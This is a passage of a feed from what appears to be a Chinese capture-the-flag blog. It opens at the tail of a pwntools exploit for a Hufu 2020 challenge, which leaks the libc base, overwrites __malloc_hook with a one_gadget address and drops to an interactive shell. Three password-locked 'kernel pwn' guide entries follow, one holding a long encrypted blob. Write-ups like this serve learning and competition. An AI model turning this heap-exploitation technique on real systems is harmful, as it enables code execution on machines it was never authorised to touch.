class="line">new(<span class="number">0x500</span>)</span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x500</span>)</span><br><span class="line">leak(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">'LIBC:\t'</span> + hex(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = [<span class="number">0xCB79A</span>,<span class="number">0xCB79D</span>,<span class="number">0xCB7A0</span>,<span class="number">0xE926B</span>, <span class="number">0xE9277</span>]  <span class="comment">#Kali 2.30</span></span><br><span class="line">rce = libc_base + one_gadget[<span class="number">3</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">new(<span class="number">0x7FFFFFFF00000000</span>+<span class="number">0xFF0</span>)</span><br><span class="line">rand_1 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">rand_2 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">randq_1 = <span class="string">''</span></span><br><span class="line">randq_2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-2</span>):</span><br><span class="line">randq_1 += (rand_1[i<span class="number">-1</span>] + rand_1[i])</span><br><span class="line">randq_2 += (rand_2[i<span class="number">-1</span>] + rand_2[i])</span><br><span class="line">rceq = (int(randq_1,<span class="number">16</span>) ^ rce)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">reallocq = (int(randq_2,<span class="number">16</span>) ^ realloc)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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